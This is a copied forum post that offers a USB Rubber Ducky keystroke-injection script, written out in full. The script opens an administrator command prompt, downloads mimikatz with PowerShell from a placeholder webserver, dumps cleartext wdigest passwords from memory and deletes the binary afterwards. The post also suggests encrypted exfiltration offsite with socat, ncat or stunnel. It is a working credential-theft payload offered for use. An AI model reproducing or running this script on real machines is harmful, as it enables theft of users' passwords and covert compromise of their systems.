The following payload was written by redmeatuk. 

The payload's forum is located here: 

http://forums.hak5.org/index.php?/topic/29657-payload-ducky-script-using-mimikatz-to-dump-passwords-from-memory/

# From this point on is a copy paiste of redmeatuk's post in the forum. 
Hello all,

 

This is a Ducky script I knocked up to use the wonderful mimikatz tool. This tool allows you to dump hashes including the clear text passwords for wdigest from memory.

 

http://blog.gentilki...mikatz/minidump

http://www.room362.c...rds-with-a.html

 

Requirements -:

 

- Webserver to host Mimikatz binary for your architecture (I tested this on Windows 7 Home Premium 64-bit) you need the ones in the 'alpha' subfolder of the zip/7z file for your architecture

- Local user needs to be an administrator account/privs

 

What does it do ?

 

1. It spawns a command shell with administrator privileges

2. It downloads mimikatz from a webserver using powershell

3. Using mimikatz to dump wdigest passwords from memory

4. Cleans up by deleting the binaries it downloaded

 

It could be improved by using sneaky data exfil techniques to transfer the data encrypted offsite e.g. socat, ncat SSL, stunnel etc If you have a firmware installed that lets you store files you could copy the output to the SD card. Also mimikatz file could be encoded and run through powershell to generate the executable instead of 'wget'ing' the file.

 

You may need to adjust timings in this script to play nice on your machine(s).

 

Script -:

```
REM mimikatz ducky script to dump local wdigest passwords from memory using mimikatz (local user needs to be an administrator/have admin privs)
DELAY 3000
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 300
ENTER
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<replace me with webserver ip/host>/mimikatz.exe','%TEMP%\mimikatz.exe')
DELAY 300
ENTER
DELAY 3000
STRING %TEMP%\mimikatz.exe
DELAY 300
ENTER
DELAY 3000
STRING privilege::debug
DELAY 300
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
DELAY 300
ENTER
DELAY 1000
STRING exit
DELAY 300
ENTER
DELAY 100
STRING del %TEMP%\mimikatz.exe
DELAY 300
ENTER
```